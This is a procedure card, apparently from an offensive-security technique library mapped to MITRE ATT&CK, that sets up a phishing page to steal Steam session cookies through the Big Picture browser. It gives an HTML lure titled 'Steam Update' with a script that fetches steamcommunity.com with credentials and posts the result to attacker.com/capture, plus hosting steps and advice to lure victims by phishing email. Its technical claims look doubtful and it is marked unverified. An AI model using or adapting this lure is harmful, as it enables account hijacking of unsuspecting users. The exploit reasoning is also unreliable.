---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
name: Setup-Malicious-Page-for-Cookie-Leak
tags:
  - cross-origin
  - phishing
  - steam
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - Desktop Application (Steam Big Picture)
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:33:24.518Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Setup-Malicious-Page-for-Cookie-Leak

## Summary

This procedure sets up a malicious webpage designed to exploit the Steam Big Picture browser's vulnerability by initiating a request from a trusted Steam domain that forwards to an attacker-controlled server, causing secure cookies to be included improperly.

## Description

The Steam Big Picture mode's embedded web browser fails to properly enforce same-origin policy for cookies when requests are forwarded across origins. An attacker creates a page that loads content from a trusted Steam domain (e.g., via iframe or AJAX) and then redirects the request to their server. When the victim loads this page in Big Picture mode while logged into Steam, the browser attaches secure cookies to the cross-origin request, leaking them to the attacker. This targets users in the Steam ecosystem and requires social engineering to get the victim to access the page.

## Requirements

1. Control over a web server to host the malicious page
2. Victim logged into Steam and using Big Picture mode
3. Publicly accessible domain for the attacker (or use tunneling like ngrok)

## Defense

Defensive measures and detection strategies:

- Disable or restrict third-party content loading in embedded browsers
- Implement strict cookie attributes (Secure, SameSite=Strict) to prevent cross-origin leakage
- Monitor for anomalous requests from Steam domains to unknown origins

## Objectives

1. Trick the victim into loading the malicious page in Steam Big Picture mode
2. Initiate a cross-origin request that includes secure cookies
3. Prepare for cookie capture in the next stage

## Instructions

### Step 1: Create the Malicious HTML Page

**Context**: Build an HTML file that embeds or fetches from a trusted Steam URL and forwards to your capture endpoint.

Create a file named `leak.html` with the following content:

```html
<!DOCTYPE html>
<html>
<head><title>Steam Update</title></head>
<body>
<script>
  // Simulate load from trusted domain
  fetch('https://steamcommunity.com/', {credentials: 'include'})
    .then(response => {
      // Forward to attacker server
      fetch('https://attacker.com/capture', {
        method: 'POST',
        credentials: 'include',
        body: response.body
      });
    });
</script>
</body>
</html>
```

> This script attempts to fetch from Steam (trusted) with credentials, then forwards to attacker.com, causing cookie inclusion in the cross-origin POST.

### Step 2: Host the Page

**Context**: Serve the page from your controlled domain to make it accessible to the victim.

Use a simple web server:

```bash
python3 -m http.server 8000
```

> Host `leak.html` in the server directory. Access via http://your-ip:8000/leak.html. Lure the victim (e.g., via phishing email) to open this in Steam Big Picture mode.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[cross-origin]]
- [[Phishing]]
- [[steam]]
